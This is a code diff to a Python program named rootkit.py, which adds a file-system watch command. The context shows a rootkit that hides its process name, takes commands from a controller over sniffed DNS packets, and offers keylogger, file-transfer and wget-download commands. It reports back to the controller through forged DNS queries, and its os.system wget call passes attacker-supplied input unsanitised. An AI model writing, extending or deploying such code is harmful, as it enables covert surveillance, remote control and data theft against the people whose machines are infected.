@@ -19,6 +19,7 @@ from utils.encryption import StreamEncryption
 from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER
 from utils.validation import validate_ipv4_address, validate_nic_interface
 from utils.process import hide_process_name
+from utils.monitor import FileSystemMonitor
 
 # Third Party Libraries
 from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send, conf
@@ -28,6 +29,7 @@ PARSER = argparse.ArgumentParser("./rootkit.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
 PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 ARGS = PARSER.parse_args()
+MONITOR = FileSystemMonitor()
 
 
 # Manually set scapy to use libpcap instead of bpkfilter.
@@ -144,6 +146,13 @@ def execute_wget_command(url: str, filepath: str) -> bool:
     os.system(f"wget {url} -P {filepath}")
     return True
 
+def execute_watch_command(path: str) -> bool:
+    if not os.path.exists(path):
+        query = forge_dns_query(data=f"ERRORMSG: Path: {path} does not exist.")
+        send_dns_query(query)
+        return False
+    return True
+
 
 def list_directory_contents(file_path: str) -> list:
     """
@@ -176,7 +185,7 @@ def packet_handler(pkt):
             if argv[1] == TRANSFER:
                 print("Transfer the keylogger!")
         if argv[0] == WATCH:
-            print(f"watch {argv[1]}")
+            execute_watch_command(argv[1])
     if argc == 3:
         if argv[0] == WGET:
             execute_wget_command(argv[1], argv[2])
